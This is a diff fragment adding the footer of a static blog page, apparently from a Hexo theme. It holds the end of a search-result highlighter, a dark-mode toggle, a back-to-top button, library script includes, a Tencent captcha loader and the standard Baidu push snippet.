+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
